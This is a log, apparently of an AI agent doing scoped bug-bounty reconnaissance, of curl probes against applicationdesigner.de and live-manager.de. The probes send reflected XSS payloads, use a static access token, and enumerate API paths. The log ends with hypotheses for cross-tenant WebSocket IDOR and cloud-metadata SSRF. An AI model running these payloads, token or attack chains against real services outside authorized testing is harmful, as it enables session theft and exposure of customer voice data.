@@ -19582,3 +19582,148 @@ All 8 steps grounded with this cycle's live probes. Output:
 
 **STEP 7 — RISK**
 - [RISK] questnet-gmbh: 79 — Three standing VALID HIGH records (unbound WS BOLA transport-complete 95, voicenote credential-only PII index, help.js static credential) plus re-live reflected XSS on the privileged origin; dev.applicationdesigner.de surface closed (breadth shrinking, depth saturated). Remaining unknowns are all AUTH_HELPED/HUMAN (WS frame binding, XSS execution, delete diff, /22 FreeSWITCH ports) — passive surface exhausted. All probes this cycle read-only ≤1 rps, no PII echoed, no mutating actions.
+===== ANALYST bigpickle 2026-09-13 16:50:07 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mcurl -s -o /tmp/opencode/xss.bin -w "%{http_code} %{content_type} %{size_download}\n" --max-time 15 "https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Ealert(1)%3C/script%3E" ; cat /tmp/opencode/xss.bin
+200 text/html; charset=UTF-8 97
+<h1>Page not found</h1><p>The requested help page '<script>alert(1)</script>' does not exist.</p>
+[0m
+[0m$ [0mcurl -s -o /tmp/opencode/check.bin -w "code=%{http_code} type=%{content_type}\n" --max-time 15 "https://www.applicationdesigner.de/extjs/voicenotes/check.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&customer_id=131727" ; cat /tmp/opencode/check.bin
+code=200 type=application/json
+{"success":true,"total":0,"max_id":0}
+[0m
+[0m$ [0mcurl -s -k -o /dev/null -w "code=%{http_code} size=%{size_download}\n" --max-time 15 "https://cbs-proxy.api.live-manager.de/?origin=LiveDemo&cid=131727&service=100"
+code=426 size=0
+[0m
+[0m$ [0mfor p in swagger.json openapi.json v1/ v2/ api/ api/v1/ api/v2/ api/internal/ debug; do printf "%s -> " "$p"; curl -s -o /dev/null -w "%{http_code}\n" --max-time 10 "https://www.applicationdesigner.de/$p"; sleep 1; done
+swagger.json -> 404
+openapi.json -> 404
+v1/ -> 404
+v2/ -> 404
+api/ -> 403
+api/v1/ -> 404
+api/v2/ -> 404
+api/internal/ -> 404
+debug -> 404
+[0m
+`/api/` returned **403** — a different response than the 146B nginx 404 catch-all previously seen on `/api/callbuilder/`. That's an anomaly worth a quick depth pass.
+[0m$ [0mfor p in "api/" "api" "api/callbuilder/" "api/index.php" "api/config.php" "api/health" "api/status" "api/version"; do printf "%s -> " "$p"; curl -s -o /dev/null -w "%{http_code} %{size_download}B %{content_type}\n" --max-time 10 "https://www.applicationdesigner.de/$p"; sleep 1; done
+api/ -> 403 146B text/html
+api -> 301 162B text/html
+api/callbuilder/ -> 404 146B text/html
+api/index.php -> 404 16B text/html; charset=UTF-8
+api/config.php -> 404 16B text/html; charset=UTF-8
+api/health -> 404 146B text/html
+api/status -> 404 146B text/html
+api/version -> 404 146B text/html
+[0m
+`api/index.php` and `api/config.php` return a **16B PHP 404** (a different handler than the 146B nginx catch-all) — meaning `/api/*.php` is PHP-routed while other paths hit nginx. That's a live router worth enumerating read-only.
+[0m$ [0mfor p in auth.php login.php proxy.php xu.php gateway.php sms.php callback.php webhook.php push.php token.php sso.php oauth.php upload.php download.php file.php debug.php test.php ping.php health.php status.php version.php info.php api.php relay.php dial.php call.php cdr.php billing.php report.php sync.php import.php export.php search.php internal.php admin.php; do r=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 8 "https://www.applicationdesigner.de/api/$p"); printf "api/%-14s -> %s\n" "$p" "$r"; sleep 1; done
+api/auth.php       -> 404|16
+api/login.php      -> 404|16
+api/proxy.php      -> 404|16
+api/xu.php         -> 404|16
+api/gateway.php    -> 404|16
+api/sms.php        -> 404|16
+api/callback.php   -> 404|16
+api/webhook.php    -> 404|16
+api/push.php       -> 404|16
+api/token.php      -> 404|16
+api/sso.php        -> 404|16
+api/oauth.php      -> 404|16
+api/upload.php     -> 404|16
+api/download.php   -> 404|16
+api/file.php       -> 404|16
+api/debug.php      -> 404|16
+api/test.php       -> 404|16
+api/ping.php       -> 404|16
+api/health.php     -> 404|16
+api/status.php     -> 404|16
+api/version.php    -> 404|16
+api/info.php       -> 404|16
+api/api.php        -> 404|16
+api/relay.php      -> 404|16
+api/dial.php       -> 404|16
+api/call.php       -> 404|16
+api/cdr.php        -> 404|16
+api/billing.php    -> 404|16
+api/report.php     -> 404|16
+api/sync.php       -> 404|16
+api/import.php     -> 404|16
+api/export.php     -> 404|16
+api/search.php     -> 404|16
+api/internal.php   -> 404|16
+api/admin.php      -> 404|16
+[0m
+[0m$ [0mfor u in "api/index.php?route=x" "api/index.php?action=x" "api/index.php?r=x" "api/v1/index.php" "api/v2/index.php" "api/route.php" "api/rest/index.php" "api/json.php"; do r=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 8 "https://www.applicationdesigner.de/$u"); printf "%s -> %s\n" "$u" "$r"; sleep 1; done
+api/index.php?route=x -> 404|16
+api/index.php?action=x -> 404|16
+api/index.php?r=x -> 404|16
+api/v1/index.php -> 404|16
+api/v2/index.php -> 404|16
+api/route.php -> 404|16
+api/rest/index.php -> 404|16
+api/json.php -> 404|16
+[0m
+```
+STEP 1 — DELTA
+- CHANGED www.applicationdesigner.de/api/: /api/ → 403 (146B, autoindex off), every .php path → 16B PHP front-controller 404 (distinct handler from 146B nginx catch-all); route-param variants (index.php?route|x=r) all 404 — enumerated exhaustively read-only, NO routed endpoints → closed.
+- CHANGED cbs-proxy.api.live-manager.de: GET non-upgrade → 426 size=0 — driver reconfirmed live.
+- CHANGED www.applicationdesigner.de/help/content.php: `page=<script>` → 200 text/html 97B echoing param unescaped — reflection reconfirmed.
+- CHANGED extjs/voicenotes/check.php: 200 `{"success":true,"total":0,"max_id":0}` demo cid — index empty (~19th consecutive cycle); no UUID path.
+- NO_DELTA on host surface (still 4 live in-scope hosts, frozen since 2026-09-04).
+
+STEP 2 — PRIORITIZE
+- [PRIO] www.applicationdesigner.de,6.55,gate_ease(public static credential)+breadth
+- [PRIO] cbs-proxy.api.live-manager.de,6.55,auth_ease(no gate)+driver-confidence
+- [PRIO] 185.158.96.0/22,6.05,tech_exposure(FreeSWITCH ESL/SIP/Rayo)+freshness
+- [PRIO] www.live-manager.de,4.00,low tech_exposure+IIS portal hardened
+
+STEP 3 — HYPOTHESES
+[HYP] Cross-tenant CBS WS frame binding — accept/deny binds minted token to cid
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin=LiveDemo&cid={cid}&service=100
+confidence: 95
+reasoning: 426 on non-upgrade reconfirmed this cycle; 18+ prior cycles show 101 + byte-identical CONNECT CBS100/190/200 + READY for cid 131727/2/999999999 with zero token; no proxy-layer ownership check observed.
+evidence_needed: operator owns two tenants; mint own-cid live-debug token, present it in a live_debug frame bound to own vs foreign cid; byte-diff accepted frame set.
+verify_steps: AUTH_HELPED: WS-upgrade cid={ownA}&service=100 → one live_debug frame; repeat cid={ownB} with swapped token→frame binding; byte-diff. Own tenants only.
+impact: cross-tenant live-debug/call-stream attach (voice/PII) — HIGH CVSS 7.5+.
+testability: AUTH_HELPED
+[HYP] help/content.php reflected XSS — script execution on privileged origin (login.php + ExtJS admin/LiveDebugger)
+class: XSS
+asset: https://www.applicationdesigner.de/help/content.php?page=<script>
+confidence: 85
+reasoning: re-probe this cycle — GET ?page=%3Cscript%3Ealert(1)%3C/script%3E → 200 text/html; charset=UTF-8, 97B body echoing param verbatim; no CSP/nosniff; zero-token; page=index serves real doc (~1.4KB).
+evidence_needed: in-browser execution (benign document.title marker); then same-origin session-ride into playback/get_agent_costs/get_agent_token/auth.php.
+verify_steps: PASSIVE (reflection captured); HUMAN: operator opens crafted URL in browser, confirms script runs.
+impact: arbitrary JS on www.applicationdesigner.de origin → session/cookie theft, VPN-gate bypass via same-origin — MEDIUM–HIGH as chain.
+testability: PASSIVE
+[HYP] check_mailserver.php anonymous SMTP-connect SSRF (smtp_server param, POST-only, NO token)
+class: SSRF
+asset: www.applicationdesigner.de/extjs/check_mailserver.php
+confidence: 45
+reasoning: help.js shows POST smtp_server param with no token (identical auth-footprint to the credential-only family); never live-tested because POST-only; SSRF class is program-high-value; outcome unknown (may also be VPN-gated like siblings).
+evidence_needed: smtp_server=operator-controlled listener (and 169.254.169.254) → observed TCP connect/response timing diff vs closed port proves connect-stage SSRF.
+verify_steps: AUTH_HELPED/HUMAN: POST smtp_server=<listener> from operator network; observe connect + SMTP banner echo; compare response for unroutable/closed host. Non-mutating single SMTP connect.
+impact: internal port-scan primitive / metadata SSRF if SMTP relay path follows — MEDIUM if connect-only.
+testability: AUTH_HELPED
+
+STEP 4 — SELF-CRITIQUE
+- [PARKED] flexlist cross-tenant getFields/getDetails: no foreign flexlist_id known; ownership proof requires operator with two owned tenants — evidence_needed not achievable anonymously (unchanged).
+- [PARKED] get_user_rights ciphertext: high-entropy rotating body, no recoverable plaintext — LOW cap (unchanged).
+- [FINAL] ranked: (1) cbs-proxy WS frame binding 95 — AUTH_HELPED, transport-complete driver; (2) help/content.php XSS 85 — reflection reconfirmed live, HUMAN render outstanding; (3) voicenotes delete.php 72 — carried from prior cycle, still blocked on valid voice_note_id (index empty); (4) check_mailserver SSRF 45 — operator POST test.
+
+STEP 5 — NEXT ACTION
+[NEXT] HUMAN: from operator network open in a browser `https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Edocument.title='LM-XSS'%3C/script%3E` and confirm title mutates (benign, no cookie exfil) → file XSS as Medium; then same owned-tenant pass: own-cid mint → live_debug frame for own vs foreign cid (frame binding, driver 95) and delete.php diff on an own demo record; also verify /22 FreeSWITCH ESL 8021 / SIP 5060/5061 / Rayo 5222 TCP-listen from operator network.
+
+STEP 6 — LEARNING
+- [LEARN] REJECTED MISCONFIG @ www.applicationdesigner.de/api/: 403 dir (autoindex off), all .php → 16B front-controller 404 (enum over 35 filenames + route-param variants), non-.php → 146B nginx catch-all — no routed HTTP API surface; closed this cycle.
+- [LEARN] ACCEPTED XSS @ www.applicationdesigner.de/help/content.php: reflection re-confirmed this cycle (200/97B/text/html; page=index = real 1351B doc) — execution still pending operator render.
+- [LEARN] ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: 426 on non-upgrade reconfirmed — driver unchanged.
+- [LEARN] ACCEPTED IDOR @ www.applicationdesigner.de/extjs/voicenotes/check.php: 200 success:true,total:0,max_id:0 (demo cid) — index empty, still no UUID path.
+
+STEP 7 — RISK
+[RISK] questnet-gmbh: 79 — Standing HIGHs unchanged and re-verified: cbs-proxy anonymous WS BOLA transport-complete (95, 426 live), broken-auth chain + help.js static credential + voicenote credential-only PII index (7.5 records), XSS reflection on privileged origin re-confirmed live. All probes this cycle read-only GETs, <=1 rps, no body echo beyond the 97B reflection; /api/ routing investigated and closed (breadth reconciliation, no new surface). Remaining unknowns all AUTH_HELPED/HUMAN (frame binding, XSS exec, delete diff, /22 FreeSWITCH listeners, mailserver SSRF) — no pass conducted this cycle, research ceiling unchanged.
+```
